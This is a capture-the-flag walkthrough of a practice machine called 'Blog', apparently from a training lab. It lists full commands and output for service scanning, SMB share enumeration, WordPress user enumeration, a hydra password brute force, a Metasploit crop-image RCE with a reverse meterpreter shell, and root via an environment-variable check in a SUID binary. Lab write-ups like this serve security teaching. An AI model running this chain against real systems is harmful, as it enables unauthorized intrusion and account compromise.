# Blog

### Tools

- nmap
- enum4linux
- steghide
- gobuster
- wpscan
- hydra
- ltrace
- metasploit
- smbclient

### Write-up

First off, scan the avaliables services on the server

```sh
nmap $IP -sV
```

Output:

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Found out that it is running a samba server, so I tried enum4linux:

```sh
enum4linux $IP
```

Output:

```
[+] Attempting to map shares on $IP

//$IP/print$   Mapping: DENIED Listing: N/A Writing: N/A
//$IP/BillySMB Mapping: OK Listing: OK Writing: N/A
```

BillySMB has Mapping and Listing enabled, so I connected:

```sh
smbclient //$IP/BillySMB
```

Output:

```sh
smb: \> get Alice-White-Rabbit.jpg
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (20.0 KiloBytes/sec) (average 20.1 KiloBytes/sec)
smb: \> get tswift.mp4
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (273.8 KiloBytes/sec) (average 166.2 KiloBytes/sec)
smb: \> get check-this.png
getting file \check-this.png of size 3082 as check-this.png (2.3 KiloBytes/sec) (average 142.3 KiloBytes/sec)
```

Got some files. One of them was a jpg, so I tried steghide:

```sh
steghide extract -sf Alice-White-Rabbit.jpg
```

Output:

```
Enter passphrase:
wrote extracted data to "rabbit_hole.txt".
```

Got a file that isn't that useful:

```sh
cat rabbit_hole.txt
```

Output:

```
You've found yourself in a rabbit hole, friend.
```

Tried Gobuster and searched for the `robots.txt`:

```sh
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css
```

Output:

```
/login                (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php]
```

Found that its a wordpress website, so I scanned the wordpress website using wpscan:

```sh
wpscan --url $IP --enumerate u
```

Output:

```
[+] bjoel
[+] kwheel
```

Got two users so I tried hydra with two of them:

```sh
hydra -t 64 -L users.txt -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```

Got password for `kwheel`, and then used an exploit from metasploit framework:

```sh
msfcosole
```

Console:

```
msf6 > search wordpress 5.0

Matching Modules
================

   #  Name                                                     Disclosure Date  Rank       Check  Description
   -  ----                                                     ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce                           2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   1  exploit/unix/webapp/wp_property_upload_exec              2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
   2  exploit/multi/http/wp_plugin_fma_shortcode_unauth_rce    2023-05-31       excellent  Yes    Wordpress File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution through shortcode
   3  auxiliary/scanner/http/wp_woocommerce_payments_add_user  2023-03-22       normal     Yes    Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation
   4  auxiliary/scanner/http/wp_registrationmagic_sqli         2022-01-23       normal     Yes    Wordpress RegistrationMagic task_ids Authenticated SQLi

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS $IP
RHOSTS => $IP
msf6 exploit(multi/http/wp_crop_rce) > run
```

Then got a shell, searched for SUID binaries:

```sh
find / -perm -u=s -user root -type f 2>/dev/null
```

Output:

```
/usr/sbin/checker
```

Executed with ltrace:

```sh
ltrace /usr/sbin/checker
```

Output:

```
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
```

Exported env admin:

```sh
export admin=1; /usr/sbin/checker
```

Then got root:

```sh
id
```

Output:

```
uid=0(root) gid=33(www-data) groups=33(www-data)
```
